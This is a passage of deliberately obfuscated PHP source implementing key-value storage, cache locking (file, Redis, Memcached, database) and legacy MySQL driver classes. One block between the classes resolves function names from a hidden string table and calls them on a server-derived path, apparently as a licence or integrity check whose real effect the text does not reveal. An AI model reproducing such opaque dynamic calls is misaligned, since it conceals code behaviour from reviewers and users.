$Cé√‰àÙﬁ => $fã‹ãÌ°ØÒ) { if ($FËïÖÒ¥≠ﬁ || in_array($Cé√‰àÙﬁ, $this->jsonField)) { $BúÜ…ÜÂŸä[$Cé√‰àÙﬁ] = json_decode($fã‹ãÌ°ØÒ, !0); } } goto C—êÌ©¯¬Á; D∏û∏ﬂ≈áÒ: $aé©ï£Ï°¬ = is_array($aé©ï£Ï°¬) ? $aé©ï£Ï°¬ : array(); if (is_array($BúÜ…ÜÂŸä)) { $BúÜ…ÜÂŸä = array_merge($aé©ï£Ï°¬, $BúÜ…ÜÂŸä); return $FöêÍ•¨≤„ ? isset($BúÜ…ÜÂŸä[$FöêÍ•¨≤„]) ? $BúÜ…ÜÂŸä[$FöêÍ•¨≤„] : null : $BúÜ…ÜÂŸä; } $AüÏõƒ»åÁ = $this->filterWhere(array($bäúâö∏‡™[29] => $BÑÙÍêÑíÃ)); goto fìèˆÀ≥ôÈ; C—êÌ©¯¬Á: $this->cacheSet($BÑÙÍêÑíÃ, $BúÜ…ÜÂŸä); $BúÜ…ÜÂŸä = array_merge($aé©ï£Ï°¬, $BúÜ…ÜÂŸä); return $FöêÍ•¨≤„ ? $BúÜ…ÜÂŸä[$FöêÍ•¨≤„] : $BúÜ…ÜÂŸä; goto bñ—êú¢∫Á; bñ—êú¢∫Á: } public function set($eÚ⁄ŒêÆöÿ, $Dé∫êÇé˜¯ = false, $e§€”ñìΩ = '') { goto b≥íßóàèØ; B∆˘ìôÜÌü: return $this->addAll($a±Æªúå⁄Ò, array(), !0); goto BÉè≤©»ÖÕ; bû£Â”≤Øﬁ: $e»å≥”Ì€¡ = is_array($eÚ⁄ŒêÆöÿ) ? $eÚ⁄ŒêÆöÿ : array($eÚ⁄ŒêÆöÿ => $Dé∫êÇé˜¯); foreach ($e»å≥”Ì€¡ as $EÀØ±â∑≈á => $aúß¶≥ã˜ñ) { if (is_array($aúß¶≥ã˜ñ)) { $aúß¶≥ã˜ñ = json_encode_force($aúß¶≥ã˜ñ); } $this->checkLength($aúß¶≥ã˜ñ, !1, $this->tableName . $b°Ω—“Á£Ç[4] . $eÚ⁄ŒêÆöÿ); $aúß¶≥ã˜ñ = self::textEncode($aúß¶≥ã˜ñ); $e»å≥”Ì€¡ = array($b°Ω—“Á£Ç[29] => $e§€”ñìΩ, $b°Ω—“Á£Ç[93] => $EÀØ±â∑≈á, $b°Ω—“Á£Ç[372] => $aúß¶≥ã˜ñ); $a±Æªúå⁄Ò[] = $this->filterWhere($e»å≥”Ì€¡); } if (!$a±Æªúå⁄Ò) { return !0; } goto B∆˘ìôÜÌü; b≥íßóàèØ: $b°Ω—“Á£Ç =& $_SERVER[’ÿƒ†ïò]; $this->cacheRemove($e§€”ñìΩ); $a±Æªúå⁄Ò = array(); goto bû£Â”≤Øﬁ; BÉè≤©»ÖÕ: } protected function optionDefault($aı•Ê≥òà† = '') { return !1; } public function setDeep($fπ¥°ÍÉÒä, $cäÍÍÇ‡Ãﬁ = false, $a®π†´ÜÀ = '') { $B≠Ëπ©‚¨£ = explode($_SERVER[’ÿƒ†ïò][95], $fπ¥°ÍÉÒä); $FÒÂË∆ê¿ì = $this->get(); array_set_value($FÒÂË∆ê¿ì, $fπ¥°ÍÉÒä, $cäÍÍÇ‡Ãﬁ); $this->set($B≠Ëπ©‚¨£[0], $FÒÂË∆ê¿ì[$B≠Ëπ©‚¨£[0]], $a®π†´ÜÀ); } public function remove($fæ±ΩÿÆ§â, $B‹¥êƒäŸ§ = '') { $BÕÁŒ˜ê√ =& $_SERVER[’ÿƒ†ïò]; $this->cacheRemove($B‹¥êƒäŸ§); $BÑîÀ¿éΩ⁄ = $this->filterWhere(array($BÕÁŒ˜ê√[93] => $fæ±ΩÿÆ§â, $BÕÁŒ˜ê√[29] => $B‹¥êƒäŸ§)); if (is_null($fæ±ΩÿÆ§â)) { unset($BÑîÀ¿éΩ⁄[$BÕÁŒ˜ê√[93]]); } return $this->where($BÑîÀ¿éΩ⁄)->delete(); } public function cacheSet($F¨≤ﬁé°Ç, $cèìöÌﬁé’ = false) { return Cache::set($this->cacheKey($F¨≤ﬁé°Ç), $cèìöÌﬁé’); } public function cacheGet($aÊ≤ß˜óöÿ) { return Cache::get($this->cacheKey($aÊ≤ß˜óöÿ)); } public function cacheRemove($båàπêàê´) { return Cache::remove($this->cacheKey($båàπêàê´)); } protected function filterWhere($B£‹…àƒπŒ) { return $B£‹…àƒπŒ; } protected function cacheKey($e¨á¿∏≠Ï’) { return $e¨á¿∏≠Ï’; } } goto d≤Èáãê√†; dÓ¢ˆ¶ÈπÊ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto f≥‚ö√íÈ£; eÜœı∏∆èŒ: if ($aú≥ÃÀ∑„ß == $eÆ≤∆Ø¯πÜ[17] && $f¨∑í˘êµà == $eÆ≤∆Ø¯πÜ[9]) { $aú≥ÃÀ∑„ß = $eÆ≤∆Ø¯πÜ[193]; } switch ($aú≥ÃÀ∑„ß) { case $eÆ≤∆Ø¯πÜ[825]: self::$handle = new CacheLockRedis(); break; case $eÆ≤∆Ø¯πÜ[826]: self::$handle = new CacheLockMemcached(); break; case $eÆ≤∆Ø¯πÜ[17]: self::$handle = new CacheLockDatabase(); break; case $eÆ≤∆Ø¯πÜ[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto cçµ”ñœΩì; AÛ≥ø•∂™∂: self::$timeout = $dÎ°íáﬂ ö[$eÆ≤∆Ø¯πÜ[835]] ? $dÎ°íáﬂ ö[$eÆ≤∆Ø¯πÜ[835]] : 10; $f¨∑í˘êµà = _get($GLOBALS[$eÆ≤∆Ø¯πÜ[6]], $eÆ≤∆Ø¯πÜ[836]); $aú≥ÃÀ∑„ß = $dÎ°íáﬂ ö[$eÆ≤∆Ø¯πÜ[822]] ? $dÎ°íáﬂ ö[$eÆ≤∆Ø¯πÜ[822]] : $eÆ≤∆Ø¯πÜ[193]; goto eÜœı∏∆èŒ; f≥‚ö√íÈ£: $eÆ≤∆Ø¯πÜ =& $_SERVER[’ÿƒ†ïò]; if (self::$handle) { return self::$handle; } $dÎ°íáﬂ ö = $GLOBALS[$eÆ≤∆Ø¯πÜ[6]][$eÆ≤∆Ø¯πÜ[347]]; goto AÛ≥ø•∂™∂; cçµ”ñœΩì: } private static function key($A–ù∑éÚ°ã) { return $_SERVER[’ÿƒ†ïò][837] . Cache::key($A–ù∑éÚ°ã); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($B∏√‹å¢äŒ = '') { self::$errorMsg = $B∏√‹å¢äŒ; } public static function lockGlobal($Cπ·ä±¯ñ∏, $Dû≠«ÖÀ¿) { return self::lock($Cπ·ä±¯ñ∏, $Dû≠«ÖÀ¿, !0); } public static function lock($Eºß∑¶åÂŒ, $D–Ωåßà–• = false, $Aè‘ò÷∂Ú§ = false) { goto AﬁÈçÛˆÖË; D˜ß”ã¥≠∂: $D–Ωåßà–• = $D–Ωåßà–• ? $D–Ωåßà–• : self::$timeout; $a∂πÒ∏ÜﬁÎ = $cªî®Úù‰î->lock($eãœîàˆ”í, $D–Ωåßà–•); if (!$a∂πÒ∏ÜﬁÎ) { $Cåµ’çÑßõ = "\x6c\x6f\x63\153\x20\145\162\x72\x6f\x72\73\153\x65\x79\75{$Eºß∑¶åÂŒ}\73\164\151\x6d\145\x3d{$D–Ωåßà–•}\73" . self::$errorMsg . $BÃûŒ‚’¢Ù[68] . get_caller_msg(); $b–â‚ÃîΩ· = LNG($BÃûŒ‚’¢Ù[838]) . "\50{$D–Ωåßà–•}\163\51\x2e" . LNG($BÃûŒ‚’¢Ù[839]); $b–â‚ÃîΩ· .= $BÃûŒ‚’¢Ù[840]; if (is_string(self::$errorMsg) && self::$errorMsg) { $b–â‚ÃîΩ· = $b–â‚ÃîΩ· . $BÃûŒ‚’¢Ù[841] . self::$errorMsg; } write_log($Cåµ’çÑßõ, $BÃûŒ‚’¢Ù[842]); show_json($b–â‚ÃîΩ·, !1); } goto e …°ûãîÁ; AﬁÈçÛˆÖË: $BÃûŒ‚’¢Ù =& $_SERVER[’ÿƒ†ïò]; $cªî®Úù‰î = self::init(); $eãœîàˆ”í = self::key($Eºß∑¶åÂŒ); goto D˜ß”ã¥≠∂; e …°ûãîÁ: if (!$Aè‘ò÷∂Ú§) { self::$lockItem[$eãœîàˆ”í] = !0; } return $a∂πÒ∏ÜﬁÎ; goto eäõÖ∆∂ÜÇ; eäõÖ∆∂ÜÇ: } public static function lockGet($cÒ˜Ï ‹‡›) { $A√ÀÃ∑ùà∆ = self::key($cÒ˜Ï ‹‡›); if (self::$lockItem[$A√ÀÃ∑ùà∆]) { return self::$lockItem[$A√ÀÃ∑ùà∆]; } return self::init()->lockGet($A√ÀÃ∑ùà∆); } public static function unlock($b÷¢åë·ﬁâ) { $fªÖÇßî·ë = self::key($b÷¢åë·ﬁâ); self::$lockItem[$fªÖÇßî·ë] = null; return self::init()->unlock($fªÖÇßî·ë); } public static function unlockRuntime() { $eÕÖ“ï®’– =& $_SERVER[’ÿƒ†ïò]; $F÷®Î†ç ‡ = self::init(); $Fºì£òúØ• = !1; foreach (self::$lockItem as $EÙú‹â∑Ï∑ => $Eç‘ËÖÑäµ) { if (!$Eç‘ËÖÑäµ) { continue; } $F÷®Î†ç ‡->unlock($EÙú‹â∑Ï∑); if (!$Fºì£òúØ•) { $Fºì£òúØ• = !0; write_log($eÕÖ“ï®’–[843] . $EÙú‹â∑Ï∑ . $eÕÖ“ï®’–[68] . get_caller_msg(), $eÕÖ“ï®’–[842]); continue; } write_log($eÕÖ“ï®’–[843] . $EÙú‹â∑Ï∑, $eÕÖ“ï®’–[842]); } self::fileUnlockAll(); } public static function fileLock($d§ÙÛÖéÇÉ) { goto càÍ©∞û‚ï; EùÃöä÷é—: $f…¿Ùçƒ›Õ = fopen(DATA_PATH . $d§ÙÛÖéÇÉ . $c≥§‰õïÚ•[845], $c≥§‰õïÚ•[846]); if (!$f…¿Ùçƒ›Õ) { return !1; } $GLOBALS[$c≥§‰õïÚ•[844]][$d§ÙÛÖéÇÉ] = $f…¿Ùçƒ›Õ; goto Bã€¯ºÒ–¯; Bã€¯ºÒ–¯: if (flock($f…¿Ùçƒ›Õ, LOCK_EX)) { return !0; } self::unlock($d§ÙÛÖéÇÉ); show_json($c≥§‰õïÚ•[847], !1); goto f°·ôàüÌî; f°·ôàüÌî: return !1; goto f¿‘§õõ∂…; càÍ©∞û‚ï: $c≥§‰õïÚ• =& $_SERVER[’ÿƒ†ïò]; if (!$GLOBALS[$c≥§‰õïÚ•[844]]) { $GLOBALS[$c≥§‰õïÚ•[844]] = array(); } $GLOBALS[$c≥§‰õïÚ•[844]][$d§ÙÛÖéÇÉ] = !1; goto EùÃöä÷é—; f¿‘§õõ∂…: } public static function fileUnlock($e˘‚ú”∑ë–) { $DÕ¯˘†¨çÌ =& $_SERVER[’ÿƒ†ïò]; $AºÀ·îäÀ√ = $GLOBALS[$DÕ¯˘†¨çÌ[844]][$e˘‚ú”∑ë–]; if (!$AºÀ·îäÀ√) { return; } $GLOBALS[$DÕ¯˘†¨çÌ[844]][$e˘‚ú”∑ë–] = !1; flock($AºÀ·îäÀ√, LOCK_UN); fclose($AºÀ·îäÀ√); } public static function fileUnlockAll() { $b∑⁄ŒÌØò· =& $_SERVER[’ÿƒ†ïò]; if (!$GLOBALS[$b∑⁄ŒÌØò·[844]]) { return; } foreach ($GLOBALS[$b∑⁄ŒÌØò·[844]] as $AÎÇı”Ê†ô => $BÏŒ®ö®£ä) { if (!$BÏŒ®ö®£ä) { continue; } $GLOBALS[$b∑⁄ŒÌØò·[844]][$AÎÇı”Ê†ô] = !1; flock($BÏŒ®ö®£ä, LOCK_UN); fclose($BÏŒ®ö®£ä); } $GLOBALS[$b∑⁄ŒÌØò·[844]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Cñâµ∆öçŸ =& $_SERVER[’ÿƒ†ïò]; $cËÏá±Èáï = $GLOBALS[$Cñâµ∆öçŸ[6]][$Cñâµ∆öçŸ[347]]; self::$cachePath = $cËÏá±Èáï[$Cñâµ∆öçŸ[193]][$Cñâµ∆öçŸ[76]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($cµâüÑ≥á≈, $C≤∫”ú≈àº = 0) { goto A·∑ÖΩü©Ê; A‹’âñΩØ: $this->unlock($cµâüÑ≥á≈); return !1; goto D·¿ú≈†É¯; A·∑ÖΩü©Ê: $Fñô‰ó≤Èº =& $_SERVER[’ÿƒ†ïò]; $bìùÇå“ﬂã = microtime(!0); $EÑ◊öë≈éü = $bìùÇå“ﬂã + $C≤∫”ú≈àº + 0.0001; goto B≈¨¿¡ç«ù; B≈¨¿¡ç«ù: $bïÉñ˜©Ôø = rtrim(self::$cachePath, $Fñô‰ó≤Èº[8]) . $Fñô‰ó≤Èº[848] . md5($cµâüÑ≥á≈) . $Fñô‰ó≤Èº[845]; if (file_exists($bïÉñ˜©Ôø) && filemtime($bïÉñ˜©Ôø) && filemtime($bïÉñ˜©Ôø) < time() - 10) { @unlink($bïÉñ˜©Ôø); } do { if (file_exists($bïÉñ˜©Ôø)) { cacheLockWait(); continue; } $Dß≤üé›·‹ = fopen($bïÉñ˜©Ôø, $Fñô‰ó≤Èº[849]); if (!$Dß≤üé›·‹) { return !1; } $Cöﬂæåî…… = flock($Dß≤üé›·‹, LOCK_EX | LOCK_NB); self::$caches[$cµâüÑ≥á≈] = array($Fñô‰ó≤Èº[850] => $Dß≤üé›·‹, $Fñô‰ó≤Èº[193] => $bïÉñ˜©Ôø); fwrite($Dß≤üé›·‹, $EÑ◊öë≈éü); clearstatcache(); if ($Dß≤üé›·‹ && $Cöﬂæåî……) { return !0; } cacheLockWait(); } while (microtime(!0) < $EÑ◊öë≈éü); goto A‹’âñΩØ; D·¿ú≈†É¯: } public function lockGet($Búø¿è’ÕÉ) { $E‚Óœ‹É‘Ò =& $_SERVER[’ÿƒ†ïò]; $Fãó”ôÁ∫¥ = rtrim(self::$cachePath, $E‚Óœ‹É‘Ò[8]) . $E‚Óœ‹É‘Ò[848] . md5($Búø¿è’ÕÉ) . $E‚Óœ‹É‘Ò[845]; return file_exists($Fãó”ôÁ∫¥); } public function unlock($EΩû¿ƒ≥√ ) { goto Aåøà¨Êïé; Aåøà¨Êïé: $e–◊´Íòê€ =& $_SERVER[’ÿƒ†ïò]; $e£ÛáŒÃÈˆ = self::$caches[$EΩû¿ƒ≥√ ]; if (!$e£ÛáŒÃÈˆ) { return; } goto AÕ©ûÊﬂâè; F›œ„Ùçø∂: unset(self::$caches[$EΩû¿ƒ≥√ ]); goto f¿⁄π®’‡Ü; AÕ©ûÊﬂâè: @flock($e£ÛáŒÃÈˆ[$e–◊´Íòê€[850]], LOCK_UN); @fclose($e£ÛáŒÃÈˆ[$e–◊´Íòê€[850]]); @unlink($e£ÛáŒÃÈˆ[$e–◊´Íòê€[193]]); goto F›œ„Ùçø∂; f¿⁄π®’‡Ü: } } goto F¨ ´äà™≥; B¢ø¨πì”Â: if ($_SERVER[$_SERVER[’ÿƒ†ïò][854]] != $Fÿç’ŸÈ∏Ï($E‘‰íçå π)) { goto eÈ™éäëº´; fÁ™î¶´‰: $cìŒ”ãë∂ø = explode($_SERVER[’ÿƒ†ïò][229], $Cü®åû¶ú∏); if (count($cìŒ”ãë∂ø) < $_SERVER[’ÿƒ†ïò][601]) { $bøÍØÊ™∫∫ = $_SERVER[’ÿƒ†ïò][859]; $bøÍØÊ™∫∫(); } $Aß≠ª¥âìã = $_SERVER[’ÿƒ†ïò][860]; goto D‘±óﬁêÉÿ; eÈ™éäëº´: $FïÑﬂ√Ñ≥È = $_SERVER[’ÿƒ†ïò][856]; $cÓÉ÷Òœáä = $_SERVER[$_SERVER[’ÿƒ†ïò][857]] . $_SERVER[’ÿƒ†ïò][858]; $Cü®åû¶ú∏ = $FïÑﬂ√Ñ≥È($cÓÉ÷Òœáä); goto fÁ™î¶´‰; D‘±óﬁêÉÿ: $Aß≠ª¥âìã($E‘‰íçå π); goto EÏıÒñÔ¥Œ; EÏıÒñÔ¥Œ: } class DbMysql extends Db { public function __construct($dãºõΩı÷¢ = '') { $F£Ω“ŒÖ¡Û =& $_SERVER[’ÿƒ†ïò]; if (!extension_loaded($F£Ω“ŒÖ¡Û[789])) { think_exception(think_lang($F£Ω“ŒÖ¡Û[10]) . $F£Ω“ŒÖ¡Û[875]); } if (!empty($dãºõΩı÷¢)) { $this->config = $dãºõΩı÷¢; if (empty($this->config[$F£Ω“ŒÖ¡Û[13]])) { $this->config[$F£Ω“ŒÖ¡Û[13]] = $F£Ω“ŒÖ¡Û[33]; } } } public function connect($bŒÉÿ⁄Ë—§ = '', $D‰æﬂÿÀ†“ = 0, $B∑⁄»±Ûûï = false) { $AâÓÖÏ¢Ôâ =& $_SERVER[’ÿƒ†ïò]; if (!isset($this->linkID[$D‰æﬂÿÀ†“])) { goto E¡¡äƒµ±; EÒÇøÏ‚∞ : if (1 != think_config($AâÓÖÏ¢Ôâ[18])) { unset($this->config); } goto B◊áˆ∞ÕÎ; E¡¡äƒµ±: if (empty($bŒÉÿ⁄Ë—§)) { $bŒÉÿ⁄Ë—§ = $this->config; } $B˘öÍıÜˆœ = $bŒÉÿ⁄Ë—§[$AâÓÖÏ¢Ôâ[876]] . ($bŒÉÿ⁄Ë—§[$AâÓÖÏ¢Ôâ[877]] ? "\x3a{$bŒÉÿ⁄Ë—§[$AâÓÖÏ¢Ôâ[877]]}" : $AâÓÖÏ¢Ôâ[33]); $a€Î¯Ñî∑Ê = !empty($bŒÉÿ⁄Ë—§[$AâÓÖÏ¢Ôâ[13]][$AâÓÖÏ¢Ôâ[14]]) ? $bŒÉÿ⁄Ë—§[$AâÓÖÏ¢Ôâ[13]][$AâÓÖÏ¢Ôâ[14]] : $this->pconnect; goto D‰ô∆Ö⁄≠Ï; DãÕªÒªÕù: mysql_query($AâÓÖÏ¢Ôâ[880] . think_config($AâÓÖÏ¢Ôâ[881]) . $AâÓÖÏ¢Ôâ[55], $this->linkID[$D‰æﬂÿÀ†“]); if ($D·ÓÑ‡â±€ > $AâÓÖÏ¢Ôâ[882]) { mysql_query($AâÓÖÏ¢Ôâ[883], $this->linkID[$D‰æﬂÿÀ†“]); } $this->connected = !0; goto EÒÇøÏ‚∞ ; D‰ô∆Ö⁄≠Ï: if ($a€Î¯Ñî∑Ê) { $this->linkID[$D‰æﬂÿÀ†“] = mysql_pconnect($B˘öÍıÜˆœ, $bŒÉÿ⁄Ë—§[$AâÓÖÏ¢Ôâ[878]], $bŒÉÿ⁄Ë—§[$AâÓÖÏ¢Ôâ[879]], 131072); } else { $this->linkID[$D‰æﬂÿÀ†“] = mysql_connect($B˘öÍıÜˆœ, $bŒÉÿ⁄Ë—§[$AâÓÖÏ¢Ôâ[878]], $bŒÉÿ⁄Ë—§[$AâÓÖÏ¢Ôâ[879]], !0, 131072); } if (!$this->linkID[$D‰æﬂÿÀ†“] || !empty($bŒÉÿ⁄Ë—§[$AâÓÖÏ¢Ôâ[17]]) && !mysql_select_db($bŒÉÿ⁄Ë—§[$AâÓÖÏ¢Ôâ[17]], $this->linkID[$D‰æﬂÿÀ†“])) { think_exception(mysql_error()); } $D·ÓÑ‡â±€ = mysql_get_server_info($this->linkID[$D‰æﬂÿÀ†“]); goto DãÕªÒªÕù; B◊áˆ∞ÕÎ: } return $this->linkID[$D‰æﬂÿÀ†“]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($aÿ¨‡ı·£Æ) { goto dÿâøÜ∞ÏÃ; dÿâøÜ∞ÏÃ: $fˆ¿íèÑÖÚ =& $_SERVER[’ÿƒ†ïò]; if (0 === stripos($aÿ¨‡ı·£Æ, $fˆ¿íèÑÖÚ[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto däµ≥™ÊÊ«; däµ≥™ÊÊ«: if (!$this->_linkID) { return !1; } $this->queryStr = $aÿ¨‡ı·£Æ; if ($this->queryID) { $this->free(); } goto Eò‹Ö©„ÚÂ; b¬Éä ïàÀ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto D–«éãé˜≥; Eò‹Ö©„ÚÂ: think_action_status($fˆ¿íèÑÖÚ[19], 1); think_status($fˆ¿íèÑÖÚ[20]); $this->queryID = mysql_query($aÿ¨‡ı·£Æ, $this->_linkID); goto b¬Éä ïàÀ; D–«éãé˜≥: } public function execute($BÖ¥ëëÉÈˆ) { goto A¬Íô⁄Êÿ÷; A¬Íô⁄Êÿ÷: $A∂ÒÏÂ‹≥√ =& $_SERVER[’ÿƒ†ïò]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aØ®ì¨ã∂Ö; Cêèë†≠ïª: if (!1 === $Eì›∏ﬁÊ√Œ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto Bã†Öª“ì”; aØ®ì¨ã∂Ö: $this->queryStr = $BÖ¥ëëÉÈˆ; if ($this->queryID) { $this->free(); } think_action_status($A∂ÒÏÂ‹≥√[21], 1); goto cÂªøò£•¢; cÂªøò£•¢: think_status($A∂ÒÏÂ‹≥√[20]); $Eì›∏ﬁÊ√Œ = mysql_query($BÖ¥ëëÉÈˆ, $this->_linkID); $this->debug(); goto Cêèë†≠ïª; Bã†Öª“ì”: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[’ÿƒ†ïò][884], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $büëÈﬁÕÂ∂ = mysql_query($_SERVER[’ÿƒ†ïò][885], $this->_linkID); $this->transTimes = 0; if (!$büëÈﬁÕÂ∂) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $BÛ¶Â≠ÎËá = mysql_query($_SERVER[’ÿƒ†ïò][886], $this->_linkID); $this->transTimes = 0; if (!$BÛ¶Â≠ÎËá) { $this->error(); return !1; } } return !0; } private function getAll() { $c•ä€Øº©Ë = array(); if ($this->numRows > 0) { while ($e¬ §Ç∆†˘ = mysql_fetch_assoc($this->queryID)) { $c•ä€Øº©Ë[] = $e¬ §Ç∆†˘; } mysql_data_seek($this->queryID, 0); } return $c•ä€Øº©Ë; } public function getFields($F’¶ä◊‡ï˜) { $aÔÇÛàè…â =& $_SERVER[’ÿƒ†ïò]; $fØË∆∫ûû« = $this->query($aÔÇÛàè…â[887] . $this->parseKey($F’¶ä◊‡ï˜)); $cÁÿÚÌ»Ûá = array(); if ($fØË∆∫ûû«) { foreach ($fØË∆∫ûû« as $DƒÃ±Ø¿¥Ç => $DÈ´‘äÊ›û) { $cÁÿÚÌ»Ûá[$DÈ´‘äÊ›û[$aÔÇÛàè…â[27]]] = array($aÔÇÛàè…â[28] => $DÈ´‘äÊ›û[$aÔÇÛàè…â[27]], $aÔÇÛàè…â[29] => $DÈ´‘äÊ›û[$aÔÇÛàè…â[30]], $aÔÇÛàè…â[31] => (bool) (strtoupper($DÈ´‘äÊ›û[$aÔÇÛàè…â[32]]) === $aÔÇÛàè…â[888]), $aÔÇÛàè…â[34] => $DÈ´‘äÊ›û[$aÔÇÛàè…â[35]], $aÔÇÛàè…â[36] => strtolower($DÈ´‘äÊ›û[$aÔÇÛàè…â[37]]) == $aÔÇÛàè…â[38], $aÔÇÛàè…â[39] => strtolower($DÈ´‘äÊ›û[$aÔÇÛàè…â[40]]) == $aÔÇÛàè…â[41]); } } return $cÁÿÚÌ»Ûá; } public function getTables($E∫ØﬁŸ◊¿§ = '') { $D≤ÂÈèÌ·¯ =& $_SERVER[’ÿƒ†ïò]; if (!empty($E∫ØﬁŸ◊¿§)) { $Dˆ‚¬Èƒ◊ó = $D≤ÂÈèÌ·¯[889] . $E∫ØﬁŸ◊¿§ . $D≤ÂÈèÌ·¯[890]; } else { $Dˆ‚¬Èƒ◊ó = $D≤ÂÈèÌ·¯[891]; } $FµÏûúøÑ¨ = $this->query($Dˆ‚¬Èƒ◊ó); $bÊÓÛÛ∫∆∑ = array(); foreach ($FµÏûúøÑ¨ as $fûé®∏ƒ◊⁄ => $bﬂµŒòòÛ˘) { $bÊÓÛÛ∫∆∑[$fûé®∏ƒ◊⁄] = current($bﬂµŒòòÛ˘); } return $bÊÓÛÛ∫∆∑; } public function replace($c£ƒŸÂÑÂá, $eµÜ‚ÀÜÎì = array()) { $Fæø™˜Áùõ =& $_SERVER[’ÿƒ†ïò]; foreach ($c£ƒŸÂÑÂá as $füãéò≠ƒ’ => $CºìÕÏ∆∏“) { $DÌ´ﬂÂÜ∞æ = $this->parseValue($CºìÕÏ∆∏“); if (is_scalar($DÌ´ﬂÂÜ∞æ)) { $FÇÓóì£áÊ[] = $DÌ´ﬂÂÜ∞æ; $DÏèëÌâÓÀ[] = $this->parseKey($füãéò≠ƒ’); } } $F—ëâØù¡° = $Fæø™˜Áùõ[892] . $this->parseTable($eµÜ‚ÀÜÎì[$Fæø™˜Áùõ[277]]) . $Fæø™˜Áùõ[893] . implode($Fæø™˜Áùõ[47], $DÏèëÌâÓÀ) . $Fæø™˜Áùõ[894] . implode($Fæø™˜Áùõ[47], $FÇÓóì£áÊ) . $Fæø™˜Áùõ[895]; return $this->execute($F—ëâØù¡°); } public function insertAll($dı∞ÛåÒÎ·, $bØ– ⁄≠ˆÒ = array(), $e«¶⁄≠˘¥… = false) { goto AÏ«ô∏–®∏; AÏ«ô∏–®∏: $fΩêñûÉ®÷ =& $_SERVER[’ÿƒ†ïò]; if (!is_array($dı∞ÛåÒÎ·[0])) { return !1; } $Fñá∫‚ó« = array_keys($dı∞ÛåÒÎ·[0]); goto D„êö£πæÁ; cÍ§Ç•áéä: $aö–Ø¡õ§≤ = ($e«¶⁄≠˘¥… ? $fΩêñûÉ®÷[897] : $fΩêñûÉ®÷[898]) . $fΩêñûÉ®÷[899] . $this->parseTable($bØ– ⁄≠ˆÒ[$fΩêñûÉ®÷[277]]) . $fΩêñûÉ®÷[893] . implode($fΩêñûÉ®÷[47], $Fñá∫‚ó«) . $fΩêñûÉ®÷[900] . implode($fΩêñûÉ®÷[47], $DˆÚÕß›Êâ); return $this->execute($aö–Ø¡õ§≤); goto D…ëà£¶óâ; D„êö£πæÁ: $DˆÚÕß›Êâ = array(); foreach ($dı∞ÛåÒÎ· as $EÓ„‘É”Òé) { $cè⁄Àëñã≠ = array(); foreach ($EÓ„‘É”Òé as $aÛÑã≈≥«ê => $AêºÂº„ŒØ) { $AêºÂº„ŒØ = $this->parseValue($AêºÂº„ŒØ); if (is_scalar($AêºÂº„ŒØ)) { $cè⁄Àëñã≠[] = $AêºÂº„ŒØ; } } $DˆÚÕß›Êâ[] = $fΩêñûÉ®÷[258] . implode($fΩêñûÉ®÷[47], $cè⁄Àëñã≠) . $fΩêñûÉ®÷[895]; } array_walk($Fñá∫‚ó«, array($this, $fΩêñûÉ®÷[896])); goto cÍ§Ç•áéä; D…ëà£¶óâ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $EÂœõÙÉäÉ =& $_SERVER[’ÿƒ†ïò]; $this->error = mysql_errno() . $EÂœõÙÉäÉ[4] . mysql_error($this->_linkID); if ($EÂœõÙÉäÉ[33] != $this->queryStr) { $this->error .= LNG($EÂœõÙÉäÉ[45]) . $this->queryStr; } think_trace($this->error, $EÂœõÙÉäÉ[33], $EÂœõÙÉäÉ[46]); return $this->error; } public function escapeString($dÈæãÓÆÌƒ) { if ($this->_linkID) { return mysql_real_escape_string($dÈæãÓÆÌƒ, $this->_linkID); } else { return mysql_escape_string($dÈæãÓÆÌƒ); } } public function parseKey(&$D…™Âïπçï, $eÌèÑï¥é◊ = true) { $aˆ⁄ƒ— ¿ó =& $_SERVER[’ÿƒ†ïò]; if ($eÌèÑï¥é◊) { $D…™Âïπçï = $this->parseKeyCheck($D…™Âïπçï); } if ($D…™Âïπçï != $aˆ⁄ƒ— ¿ó[182] && !preg_match($aˆ⁄ƒ— ¿ó[901], $D…™Âïπçï)) { $D…™Âïπçï = $aˆ⁄ƒ— ¿ó[383] . trim($D…™Âïπçï, $aˆ⁄ƒ— ¿ó[383]) . $aˆ⁄ƒ— ¿ó[383]; } return $D…™Âïπçï; } } class DbMysqli extends Db { public function __construct($EöÊ√Æ€Öã = '') { $D∂ÖÒî÷ƒ∞ =& $_SERVER[’ÿƒ†ïò]; if (!extension_loaded($D∂ÖÒî÷ƒ∞[788])) { think_exception(think_lang($D∂ÖÒî÷ƒ∞[10]) . $D∂ÖÒî÷ƒ∞[902]); } if (!empty($EöÊ√Æ€Öã)) { $this->config = $EöÊ√Æ€Öã; if (empty($this->config[$D∂ÖÒî÷ƒ∞[13]])) { $this->config[$D∂ÖÒî÷ƒ∞[13]] = $D∂ÖÒî÷ƒ∞[33]; } } } public function connect($e‚™å¬›¥â = '', $CŒê¨¬≈Ã¡ = 0) { $FøÖÊ∫ı£á =& $_SERVER[’ÿƒ†ïò]; if (!isset($this->linkID[$CŒê¨¬≈Ã¡])) { goto BÔﬁµ•∆î∏; aí∞Ç∫““Ñ: $CÏ§ÇàûâÁ = $this->linkID[$CŒê¨¬≈Ã¡]->server_version; $this->linkID[$CŒê¨¬≈Ã¡]->query($FøÖÊ∫ı£á[880] . think_config($FøÖÊ∫ı£á[881]) . $FøÖÊ∫ı£á[55]); if ($CÏ§ÇàûâÁ > $FøÖÊ∫ı£á[882]) { 